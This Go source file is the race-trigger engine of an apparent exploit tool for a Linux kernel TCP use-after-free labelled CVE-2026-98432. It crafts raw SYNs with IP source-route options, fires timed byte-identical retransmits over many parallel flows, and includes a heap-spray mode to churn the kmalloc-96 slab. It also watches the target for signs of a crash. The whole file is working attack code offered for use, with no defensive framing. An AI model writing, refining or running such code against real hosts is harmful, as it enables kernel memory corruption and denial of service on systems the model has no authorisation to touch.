// Package race implements the CVE-2026-98432 trigger engine:
// parallel TCP flows that send a SYN carrying IP options followed
// by a retransmitted SYN (same 4-tuple, same seq) after a small
// delay, racing the kernel's ownership transfer of ireq_opt into
// the child socket against the SYNACK build path on another CPU.
package race

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"runtime"
	"runtime/debug"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"cve98432/internal/config"
	"cve98432/internal/netio"
	"cve98432/internal/packet"
)

// Stats is a point-in-time view of the attack.
type Stats struct {
	Elapsed    time.Duration
	SynSent    uint64
	RtxSent    uint64
	TotalSent  uint64
	SendErrors uint64
	SynAck     uint64
	Rst        uint64
	OtherReply uint64
	Pps        float64
	Silent     bool
	// Handshake-mode only (mode "handshake").
	HsRounds  uint64 // rounds that completed the full sequence
	HsSkipped uint64 // rounds without a SYN-ACK in time
	HsReader  uint64 // reader evidence: second SYN-ACK observed
	HsRstTgt  uint64 // RSTs from the target for round 4-tuples
}

// Event is a log line for the UI.
type Event struct {
	Time  time.Duration
	Level string // "info" | "warn" | "alert"
	Msg   string
}

// Engine runs the race against a target.
type Engine struct {
	cfg config.Config

	mu      sync.Mutex
	running bool
	cancel  context.CancelFunc
	snd     *netio.Sender
	rcv     *netio.Receiver

	// Handshake mode (fire #2): a dedicated reply tap plus the three
	// pinned sender workers.
	hsTap      *netio.Tap
	hsWRTX     *hsWorker // retransmit thread (CPU_T)
	hsWACK     *hsWorker // completing-ACK thread (CPU_P)
	hsWRST     *hsWorker // dedicated closing-RST thread (CPU_R; 0 = unpinned)
	hsSynAck   atomic.Uint64
	hsSynAck2  atomic.Uint64
	hsRstTgt   atomic.Uint64
	hsRounds   atomic.Uint64
	hsSkip     atomic.Uint64
	hsLastRep  atomic.Int64
	hsSendErrs atomic.Uint64 // failed worker sends (warned, throttled)

	wg        sync.WaitGroup
	seqBase   uint32
	portSeq   atomic.Uint64
	synCount  atomic.Int64
	rtxCount  atomic.Int64
	errCount  atomic.Int64
	startedAt time.Time
	prevTotal atomic.Uint64
	prevAt    time.Time

	events    chan Event
	snapshots chan Stats
}

// New creates an engine for the given configuration.
func New(cfg config.Config) *Engine {
	return &Engine{
		cfg:       cfg,
		seqBase:   uint32(time.Now().UnixNano() & 0x7FFFFFFF),
		events:    make(chan Event, 64),
		snapshots: make(chan Stats, 16),
	}
}

// Events delivers log events.
func (e *Engine) Events() <-chan Event { return e.events }

// Snapshots delivers stats snapshots every ~250 ms while firing.
func (e *Engine) Snapshots() <-chan Stats { return e.snapshots }

func (e *Engine) eventf(level, format string, args ...any) {
	ev := Event{Time: time.Since(e.startedAt), Level: level, Msg: fmt.Sprintf(format, args...)}
	select {
	case e.events <- ev:
	default:
	}
}

// Firing reports whether the engine is currently running.
func (e *Engine) Firing() bool {
	e.mu.Lock()
	defer e.mu.Unlock()
	return e.running
}

// buildTemplates creates the SYN datagram and its byte-identical
// retransmit. The TOOL sends both datagrams itself (there is no
// kernel retransmit involved): same 4-tuple, same seq, same IP ID
// and same options. Per-round fields (src port, seq, IP ID) are
// patched by the caller.
func (e *Engine) buildTemplates() (syn1, syn2 []byte, tcpStart int, err error) {
	// The TCP checksum is baked here for a FIXED source address,
	// but raw_send_hdrinc() rewrites a 0.0.0.0 source to the
	// egress address before the packet leaves — WITHOUT touching
	// the TCP checksum. So the template must carry the real
	// egress IP, not 0.0.0.0.
	src, err := e.sourceIP()
	if err != nil {
		return nil, nil, 0, err
	}
	var opt []byte
	if strings.EqualFold(e.cfg.Payload.OptionsPreset, "custom") {
		opt, err = packet.ParseIPOptionsHex(e.cfg.Payload.CustomHex)
	} else {
		// Pass the source IP so an SSRR/LSRR hop is a real address
		// (a 0.0.0.0 hop would break the target's listeners).
		opt, err = packet.BuildIPOptions(e.cfg.Payload.OptionsPreset, src)
	}
	if err != nil {
		return nil, nil, 0, err
	}
	var tcpOpt []byte
	if e.cfg.Payload.TCPCommonOpts {
		tcpOpt = packet.TCPCommonOptions
	}
	if src == nil {
		src = net.ParseIP("0.0.0.0")
	}
	flags := uint16(0)
	if e.cfg.Payload.DFOnly {
		flags = 0x4000 // DF
	}
	seg := packet.Seg{
		SrcIP:      src,
		DstIP:      net.ParseIP(e.cfg.Target.IP),
		SrcPort:    10000,
		DstPort:    uint16(e.cfg.Target.Port),
		TTL:        uint8(e.cfg.Payload.TTL),
		IPFlags:    flags,
		TCPFlags:   packet.FlagSYN,
		Window:     uint16(e.cfg.Payload.Window),
		IPOptions:  opt,
		TCPOptions: tcpOpt,
	}
	syn1, err = seg.Build()
	if err != nil {
		return nil, nil, 0, err
	}
	syn2 = make([]byte, len(syn1))
	copy(syn2, syn1)
	tcpStart = int(syn1[0]&0x0F) * 4
	return syn1, syn2, tcpStart, nil
}

// copyTemplates returns independent per-flow copies of the two SYN
// templates. The copies (not zero-filled buffers) carry the real IP
// header and TCP segment; patch() only rewrites 8 bytes per round.
// A zero-filled buffer would leave the IP version nibble at 0 and
// make every sendto() fail with EINVAL (a silent no-op).
func copyTemplates(syn1, syn2 []byte) (buf1, buf2 []byte) {
	buf1 = append([]byte(nil), syn1...)
	buf2 = append([]byte(nil), syn2...)
	return buf1, buf2
}

// sourceIP returns the IP the outgoing SYNs will actually carry:
// the configured source_ip, or the egress address the kernel would
// pick for the target (resolved via a UDP connect, which never
// sends a packet). Failing to resolve it is an error: a 0.0.0.0
// template would carry a TCP checksum computed for zeros while the
// kernel rewrites saddr before the packet leaves, corrupting every
// datagram. Pin payload.source_ip to bypass the route lookup.
func (e *Engine) sourceIP() (net.IP, error) {
	if e.cfg.Payload.SourceIP != "" {
		ip := net.ParseIP(e.cfg.Payload.SourceIP)
		if ip == nil {
			return nil, fmt.Errorf("bad source IP %q", e.cfg.Payload.SourceIP)
		}
		return ip, nil
	}
	dst := net.ParseIP(e.cfg.Target.IP)
	if dst == nil {
		return nil, fmt.Errorf("bad target IP %q", e.cfg.Target.IP)
	}
	conn, err := net.Dial("udp", net.JoinHostPort(dst.String(), "1"))
	if err != nil {
		return nil, fmt.Errorf("cannot resolve egress IP for target %s: %w (set payload.source_ip to pin it)", dst, err)
	}
	defer conn.Close()
	if ua, ok := conn.LocalAddr().(*net.UDPAddr); ok {
		return ua.IP, nil
	}
	return nil, fmt.Errorf("unexpected local address type for target %s", dst)
}

// sendPair sends the SYN and its byte-identical retransmit with a
// delta delay between them, updating the counters.
func (e *Engine) sendPair(buf1, buf2 []byte, tcpStart int,
	srcPort uint16, seq uint32, id uint16, dst net.IP, dstPort uint16,
	delta time.Duration) {
	patch(buf1, tcpStart, srcPort, seq, id)
	patch(buf2, tcpStart, srcPort, seq, id)
	// patch rewrote IP ID and TCP port/seq, which the checksums
	// cover; recompute both before the bytes hit the wire.
	packet.Rechecksum(buf1)
	packet.Rechecksum(buf2)
	if err := e.snd.Send(buf1, dst, dstPort); err != nil {
		e.errCount.Add(1)
		return
	}
	e.synCount.Add(1)
	preciseSleep(delta)
	if err := e.snd.Send(buf2, dst, dstPort); err != nil {
		e.errCount.Add(1)
		return
	}
	e.rtxCount.Add(1)
}

// patch mutates a datagram copy: IP ID, src port, TCP seq.
func patch(pkt []byte, tcpStart int, srcPort uint16, seq uint32, id uint16) {
	pkt[4] = byte(id >> 8)
	pkt[5] = byte(id)
	pkt[tcpStart] = byte(srcPort >> 8)
	pkt[tcpStart+1] = byte(srcPort)
	pkt[tcpStart+4] = byte(seq >> 24)
	pkt[tcpStart+5] = byte(seq >> 16)
	pkt[tcpStart+6] = byte(seq >> 8)
	pkt[tcpStart+7] = byte(seq)
}

// Start opens sockets, disables GC and launches the flow workers.
// The slow setup work (egress resolution, socket open, template
// build) runs WITHOUT holding e.mu so Firing()/FinalStats() are
// not blocked by network setup; the lock guards only the state
// transition.
func (e *Engine) Start() error {
	e.mu.Lock()
	if e.running {
		e.mu.Unlock()
		return fmt.Errorf("engine already running")
	}
	e.mu.Unlock()

	if err := e.cfg.Validate(); err != nil {
		return err
	}
	dst := net.ParseIP(e.cfg.Target.IP)
	if dst == nil {
		return fmt.Errorf("bad target IP %q", e.cfg.Target.IP)
	}
	dstPort := uint16(e.cfg.Target.Port)
	// Effective source address: the configured source_ip or the
	// resolved egress address. Bind the sender to it so the kernel
	// does not rewrite saddr AFTER the checksums were computed.
	src, err := e.sourceIP()
	if err != nil {
		return err
	}
	bindIP := ""
	if src != nil {
		bindIP = src.String()
	}
	snd, err := netio.OpenSender(bindIP)
	if err != nil {
		return err
	}
	hs := e.cfg.Target.Mode == config.ModeHandshake
	var (
		rcv      *netio.Receiver
		tap      *netio.Tap
		wRtx     *hsWorker
		wAck     *hsWorker
		wRst     *hsWorker
		syn1     []byte
		syn2     []byte
		ackT     []byte
		rstT     []byte
		tcpStart int
	)
	if hs {
		tap, err = netio.OpenTap(dst, dstPort)
		if err != nil {
			snd.Close()
			return err
		}
		wRtx, wAck, wRst, err = e.newHSWorkers()
		if err != nil {
			snd.Close()
			tap.Close()
			return err
		}
		syn1, ackT, rstT, tcpStart, err = e.buildHandshakeTemplates()
	} else {
		rcv, err = netio.OpenReceiver(dst, dstPort)
		if err != nil {
			snd.Close()
			return err
		}
		syn1, syn2, tcpStart, err = e.buildTemplates()
	}
	if err != nil {
		snd.Close()
		if rcv != nil {
			rcv.Close()
		}
		if tap != nil {
			tap.Close()
		}
		// Unstarted workers exit on a closed input channel.
		if wRtx != nil {
			close(wRtx.in)
		}
		if wAck != nil {
			close(wAck.in)
		}
		if wRst != nil {
			close(wRst.in)
		}
		return err
	}
	ctx, cancel := context.WithCancel(context.Background())

	// Commit: publish the state and launch workers under the lock.
	// A concurrent Start that got here first owns the engine; this
	// one rolls back its own sockets.
	e.mu.Lock()
	defer e.mu.Unlock()
	if e.running {
		cancel()
		snd.Close()
		if rcv != nil {
			rcv.Close()
		}
		if tap != nil {
			tap.Close()
		}
		if wRtx != nil {
			close(wRtx.in)
		}
		if wAck != nil {
			close(wAck.in)
		}
		if wRst != nil {
			close(wRst.in)
		}
		return fmt.Errorf("engine already running")
	}
	e.snd = snd
	e.rcv = rcv
	e.hsTap = tap
	e.hsWRTX = wRtx
	e.hsWACK = wAck
	e.hsWRST = wRst
	e.cancel = cancel
	e.running = true
	e.startedAt = time.Now()
	e.prevTotal.Store(0)
	e.prevAt = time.Now()
	e.synCount.Store(0)
	e.rtxCount.Store(0)
	e.errCount.Store(0)
	e.hsSynAck.Store(0)
	e.hsSynAck2.Store(0)
	e.hsRstTgt.Store(0)
	e.hsRounds.Store(0)
	e.hsSkip.Store(0)
	e.hsLastRep.Store(0)

	// SSRR/LSRR over loopback is always dropped by the kernel
	// (source-routed packets need pkt_type==PACKET_HOST; 127.0.0.1
	// delivery is PACKET_LOOPBACK), regardless of the
	// accept_source_route sysctls. Emitted after startedAt is set so
	// the ring event carries a sane timestamp.
	if dst.IsLoopback() && e.usesSRR() {
		e.eventf("warn",
			"ssrr/lsrr over loopback: the kernel drops source-routed packets on 127.0.0.1 regardless of sysctls; use a non-loopback target and set net.ipv4.conf.all.accept_source_route=1 AND net.ipv4.conf/<dev>.accept_source_route=1")
	}

	debug.SetGCPercent(-1)

	if hs {
		e.wg.Add(2)
		go func() {
			defer e.wg.Done()
			e.runHandshake(ctx, dst, dstPort, syn1, ackT, rstT, tcpStart,
				e.cfg.Handshake.DeltaSweepUs, e.cfg.Handshake.GapSweepUs)
		}()
		go e.snapshotter(ctx)
		sweep := e.cfg.Handshake.DeltaSweepUs
		if len(sweep) > 0 {
			e.eventf("info",
				"firing: mode=handshake src=%s dst=%s:%d cpus rtx=%d ack=%d delta-sweep=%v timeout=%dms",
				bindIP, e.cfg.Target.IP, e.cfg.Target.Port,
				e.cfg.Handshake.CPURtx, e.cfg.Handshake.CPUAck,
				sweep, e.cfg.Handshake.SynackTimeoutMs)
		} else {
			e.eventf("info",
				"firing: mode=handshake src=%s dst=%s:%d cpus rtx=%d ack=%d delta=%dus timeout=%dms",
				bindIP, e.cfg.Target.IP, e.cfg.Target.Port,
				e.cfg.Handshake.CPURtx, e.cfg.Handshake.CPUAck,
				e.cfg.Handshake.DeltaAckUs, e.cfg.Handshake.SynackTimeoutMs)
		}
		return nil
	}

	delta := time.Duration(e.cfg.Timing.DeltaUs) * time.Microsecond
	gap := time.Duration(e.cfg.Timing.FlowGapMs) * time.Millisecond
	// spray: extra non-matching SYNs per round. Each one creates a
	// fresh request socket with ireq_opt, churning the kmalloc-96
	// slab so the UAF window is hit while the object is likely
	// reused. mptcp: same traffic, aimed at an MPTCP listener.
	probes := 0
	if e.cfg.Target.Mode == config.ModeSpray {
		probes = 2
	}

	e.wg.Add(2 + e.cfg.Timing.Flows)

	go func() {
		defer e.wg.Done()
		rcv.Run(ctx, nil)
	}()

	for i := 0; i < e.cfg.Timing.Flows; i++ {
		go func(i int) {
			defer e.wg.Done()
			rnd := rand.New(rand.NewSource(time.Now().UnixNano() + int64(i)*0x9E3779B9))
			buf1, buf2 := copyTemplates(syn1, syn2)
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}
				// Trigger pair: the retransmitted SYN must match the
				// original one (same 4-tuple and seq).
				n := e.portSeq.Add(1)
				e.sendPair(buf1, buf2, tcpStart,
					uint16(10000+n%48000),
					e.seqBase+uint32(rnd.Intn(0x40000000)),
					uint16(n%65535), dst, dstPort, delta)
				// Churn rounds (spray only): fresh 4-tuples cycle
				// ireq_opt allocations/frees in kmalloc-96.
				for p := 0; p < probes; p++ {
					select {
					case <-ctx.Done():
						return
					default:
					}
					n = e.portSeq.Add(1)
					e.sendPair(buf1, buf2, tcpStart,
						uint16(10000+n%48000),
						e.seqBase+uint32(rnd.Intn(0x40000000)),
						uint16(n%65535), dst, dstPort, delta)
				}
				if gap > 0 {
					time.Sleep(gap)
				}
			}
		}(i)
	}

	go e.snapshotter(ctx)

	srcStr := "0.0.0.0 (unresolved)"
	if src != nil {
		srcStr = src.String()
	}
	e.eventf("info", "firing: src=%s dst=%s:%d mode=%s flows=%d delta=%dus gap=%dms",
		srcStr, e.cfg.Target.IP, e.cfg.Target.Port,
		e.cfg.Target.Mode, e.cfg.Timing.Flows, e.cfg.Timing.DeltaUs, e.cfg.Timing.FlowGapMs)
	return nil
}

// usesSRR reports whether the configured IP options carry a
// source-route option (LSRR=0x83 or SSRR=0x89).
func (e *Engine) usesSRR() bool {
	p := e.cfg.Payload.OptionsPreset
	if strings.ToLower(p) == "ssrr" {
		return true
	}
	if !strings.EqualFold(p, "custom") {
		return false
	}
	b, err := packet.ParseIPOptionsHex(e.cfg.Payload.CustomHex)
	if err != nil {
		return false
	}
	for _, c := range b {
		if c == packet.IPOptLSRR || c == packet.IPOptSSRR {
			return true
		}
	}
	return false
}

// Stop cancels the run and waits for workers to drain.
func (e *Engine) Stop() {
	e.mu.Lock()
	if !e.running {
		e.mu.Unlock()
		return
	}
	e.running = false
	cancel := e.cancel
	wRtx, wAck, wRst, tap := e.hsWRTX, e.hsWACK, e.hsWRST, e.hsTap
	e.mu.Unlock()
	cancel()
	e.wg.Wait()
	// The coordinator has returned, so no job can be in flight:
	// closing the workers' input channels lets them exit (a locked
	// OS thread is released automatically when the goroutine ends).
	if wRtx != nil {
		close(wRtx.in)
	}
	if wAck != nil {
		close(wAck.in)
	}
	if wRst != nil {
		close(wRst.in)
	}
	e.snd.Close()
	if e.rcv != nil {
		e.rcv.Close()
	}
	if tap != nil {
		tap.Close()
	}
	// Drain stale entries so a re-Start() of this Engine begins
	// with clean channels.
drain:
	for {
		select {
		case <-e.events:
		case <-e.snapshots:
		default:
			break drain
		}
	}
	debug.SetGCPercent(100)
	e.eventf("info", "stopped")
}

// replyStats returns (synack, rst, other, lastReplyNano) for the
// active mode: the shared Receiver counts hammer/spray/mptcp, the
// dedicated tap counters serve handshake mode.
func (e *Engine) replyStats() (synack, rst, other, lastNano uint64) {
	if e.rcv != nil {
		a, b, c := e.rcv.ReplyCounts()
		return a, b, c, uint64(e.rcv.LastReplyNano())
	}
	return uint64(e.hsSynAck.Load()),
		uint64(e.hsRstTgt.Load()),
		uint64(e.hsSynAck2.Load()),
		uint64(e.hsLastRep.Load())
}

// FinalStats returns the cumulative counters of the last run (for
// the exit summary).
func (e *Engine) FinalStats() Stats {
	e.mu.Lock()
	defer e.mu.Unlock()
	s := Stats{
		SynSent:    uint64(e.synCount.Load()),
		RtxSent:    uint64(e.rtxCount.Load()),
		SendErrors: uint64(e.errCount.Load()),
	}
	s.TotalSent = s.SynSent + s.RtxSent
	a, b, c, _ := e.replyStats()
	s.SynAck, s.Rst, s.OtherReply = a, b, c
	s.HsRounds = uint64(e.hsRounds.Load())
	s.HsSkipped = uint64(e.hsSkip.Load())
	s.HsReader = uint64(e.hsSynAck2.Load())
	s.HsRstTgt = b
	if !e.startedAt.IsZero() {
		s.Elapsed = time.Since(e.startedAt)
	}
	return s
}

// snapshotter publishes Stats every 250 ms and runs the silence
// detector.
func (e *Engine) snapshotter(ctx context.Context) {
	defer e.wg.Done()
	t := time.NewTicker(250 * time.Millisecond)
	defer t.Stop()
	silenceSince := time.Time{}
	alerted := false
	for {
		select {
		case <-ctx.Done():
			return
		case <-t.C:
		}
		syn := e.synCount.Load()
		rtx := e.rtxCount.Load()
		total := uint64(syn + rtx)
		now := time.Now()
		s := Stats{
			Elapsed:    now.Sub(e.startedAt),
			SynSent:    uint64(syn),
			RtxSent:    uint64(rtx),
			TotalSent:  total,
			SendErrors: uint64(e.errCount.Load()),
		}
		if !e.prevAt.IsZero() {
			if dt := now.Sub(e.prevAt).Seconds(); dt > 0 {
				s.Pps = float64(total-e.prevTotal.Load()) / dt
				if s.Pps < 0 {
					s.Pps = 0
				}
			}
		}
		e.prevTotal.Store(total)
		e.prevAt = now

		synack, rst, other, lastNano := e.replyStats()
		s.SynAck, s.Rst, s.OtherReply = synack, rst, other
		s.HsRounds = uint64(e.hsRounds.Load())
		s.HsSkipped = uint64(e.hsSkip.Load())
		s.HsReader = uint64(e.hsSynAck2.Load())
		s.HsRstTgt = rst
		last := int64(lastNano)
		silent := false
		if total >= 100 && now.Sub(e.startedAt) > 3*time.Second {
			if last == 0 {
				if silenceSince.IsZero() {
					silenceSince = now
				}
				silent = now.Sub(silenceSince) > 2*time.Second
			} else {
				silent = now.Sub(time.Unix(0, last)) > 2*time.Second
			}
		}
		if silent && !alerted {
			e.eventf("alert", "no SYN-ACK/RST for 2s after %d packets - target may be down (check dmesg/KASAN on target)", total)
			alerted = true
		} else if !silent {
			alerted = false
		}
		s.Silent = silent

		select {
		case e.snapshots <- s:
		default:
		}
	}
}

// spinWait waits d by busy-spinning with Gosched yields. Spinning
// (instead of time.Sleep) is what keeps sub-millisecond delays
// precise on coarse-timer systems, where time.Sleep(125µs) lands
// ~1ms late — outside the 100–200µs UAF window. The yields keep
// the spin polite: with the default 10ms flow gap each flow is
// spinning only ~1.5% of the time, so 32 flows cost a few percent
// of total CPU, not full cores.
func spinWait(d time.Duration) {
	target := time.Now().Add(d)
	for time.Now().Before(target) {
		runtime.Gosched()
	}
}

// sleepOvershoot reports how far time.Sleep overshoots a small
// target on this machine (measured once). On coarse-timer systems
// (runtime/kernel timers without sub-millisecond resolution) a
// 125µs sleep lands ~1ms late.
var sleepOvershoot = sync.OnceValue(func() time.Duration {
	const probe = 125 * time.Microsecond
	t0 := time.Now()
	time.Sleep(probe)
	return time.Since(t0) - probe
})

const (
	// spinTail is the busy-spin window at the end of preciseSleep:
	// sleep the bulk, spin the tail.
	spinTail = 25 * time.Microsecond
	// coarseSpinMax: with coarse timers the full duration is
	// spun (up to this bound); beyond it the tick error is
	// negligible next to the duration itself.
	coarseSpinMax = 2 * time.Millisecond
)

// preciseSleep waits d. On fine-timer machines it sleeps the bulk
// of the duration and busy-spins only a ~25µs tail (cheap and
// precise). On coarse-timer machines it spins the whole duration
// (up to coarseSpinMax) with Gosched yields, preserving the
// 100–200µs window that a sub-millisecond sleep would stretch to
// a full tick.
func preciseSleep(d time.Duration) {
	if d <= spinTail || (sleepOvershoot() > 2*spinTail && d <= coarseSpinMax) {
		spinWait(d)
		return
	}
	time.Sleep(d - spinTail)
	spinWait(spinTail)
}
